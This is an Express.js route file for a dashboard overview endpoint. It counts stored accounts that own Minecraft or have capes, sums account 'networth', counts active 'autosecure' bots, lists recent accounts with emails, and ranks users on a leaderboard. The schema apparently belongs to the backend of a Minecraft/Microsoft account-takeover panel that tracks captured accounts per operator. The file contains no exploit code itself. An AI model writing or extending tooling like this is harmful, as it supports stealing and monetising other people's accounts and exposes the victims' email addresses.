const express = require('express');
const router = express.Router();
const os = require('os');
const { query, get } = require('../db');

router.get('/overview', async (req, res) => {
  try {
    const userId = req.user.id;
    const isAdmin = req.user.isAdmin;

    // Filter by strict ownership unless admin view requested
    const userPairParams = isAdmin ? [] : [userId, userId];

    // Total Accounts
    let totalAccounts = 0;
    try {
      const accRow = get(
        isAdmin 
          ? 'SELECT COUNT(*) as count FROM accounts'
          : 'SELECT COUNT(DISTINCT a.uid) as count FROM accounts a INNER JOIN accountsbyuser u ON a.uid = u.uid WHERE u.user_id = ? AND a.user_id = ?',
        userPairParams
      );
      totalAccounts = accRow?.count || 0;
    } catch (e) {}

    // Accounts with Minecraft
    let ownsMcCount = 0;
    try {
      const mcRow = get(
        isAdmin
          ? "SELECT COUNT(*) as count FROM accounts WHERE ownsmc IS NOT NULL AND ownsmc != 'No MC' AND ownsmc NOT LIKE '%Failed%'"
          : "SELECT COUNT(DISTINCT a.uid) as count FROM accounts a INNER JOIN accountsbyuser u ON a.uid = u.uid WHERE u.user_id = ? AND a.user_id = ? AND a.ownsmc IS NOT NULL AND a.ownsmc != 'No MC' AND a.ownsmc NOT LIKE '%Failed%'",
        userPairParams
      );
      ownsMcCount = mcRow?.count || 0;
    } catch (e) {}

    // Accounts with Capes
    let capesCount = 0;
    try {
      const capeRow = get(
        isAdmin
          ? "SELECT COUNT(*) as count FROM accounts WHERE capes IS NOT NULL AND capes != 'None' AND capes != '' AND capes != '[]'"
          : "SELECT COUNT(DISTINCT a.uid) as count FROM accounts a INNER JOIN accountsbyuser u ON a.uid = u.uid WHERE u.user_id = ? AND a.user_id = ? AND a.capes IS NOT NULL AND a.capes != 'None' AND a.capes != '' AND a.capes != '[]'",
        userPairParams
      );
      capesCount = capeRow?.count || 0;
    } catch (e) {}

    // Total Networth
    let totalNetworth = 0;
    try {
      const nwRow = get(
        isAdmin
          ? 'SELECT SUM(networth) as total FROM leaderboard'
          : 'SELECT networth as total FROM leaderboard WHERE user_id = ?',
        isAdmin ? [] : [userId]
      );
      totalNetworth = nwRow?.total || 0;
    } catch (e) {}

    // Active Bots
    let activeBots = 0;
    try {
      const botRow = get(
        isAdmin
          ? 'SELECT COUNT(*) as count FROM autosecure'
          : 'SELECT COUNT(*) as count FROM autosecure WHERE user_id = ?',
        isAdmin ? [] : [userId]
      );
      activeBots = botRow?.count || 0;
    } catch (e) {}

    // Quarantined accounts
    let quarantineCount = 0;
    try {
      const qRow = get(
        isAdmin
          ? 'SELECT COUNT(*) as count FROM quarantine'
          : 'SELECT COUNT(*) as count FROM quarantine WHERE user_id = ?',
        isAdmin ? [] : [userId]
      );
      quarantineCount = qRow?.count || 0;
    } catch (e) {}

    // Recent 6 accounts
    let recentAccounts = [];
    try {
      recentAccounts = query(
        isAdmin
          ? 'SELECT uid, user_id, username, ownsmc, capes, email, time FROM accounts ORDER BY id DESC LIMIT 6'
          : 'SELECT DISTINCT a.uid, a.user_id, a.username, a.ownsmc, a.capes, a.email, a.time FROM accounts a INNER JOIN accountsbyuser u ON a.uid = u.uid WHERE u.user_id = ? AND a.user_id = ? ORDER BY a.id DESC LIMIT 6',
        userPairParams
      );
    } catch (e) {}

    // Leaderboard top 8
    let leaderboard = [];
    try {
      leaderboard = query('SELECT user_id, networth, amount FROM leaderboard ORDER BY networth DESC, amount DESC LIMIT 8');
    } catch (e) {}

    // System info
    const uptimeSec = os.uptime();
    const systemInfo = {
      platform: os.platform(),
      release: os.release(),
      arch: os.arch(),
      totalMemMB: Math.round(os.totalmem() / (1024 * 1024)),
      freeMemMB: Math.round(os.freemem() / (1024 * 1024)),
      cpuCount: os.cpus().length,
      nodeVersion: process.version,
      uptimeHours: (uptimeSec / 3600).toFixed(1)
    };

    res.json({
      success: true,
      data: {
        totalAccounts,
        ownsMcCount,
        capesCount,
        totalNetworth,
        activeBots,
        quarantineCount,
        recentAccounts,
        leaderboard,
        systemInfo,
        currentUser: {
          id: userId,
          isAdmin: req.user.isAdmin
        }
      }
    });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

module.exports = router;
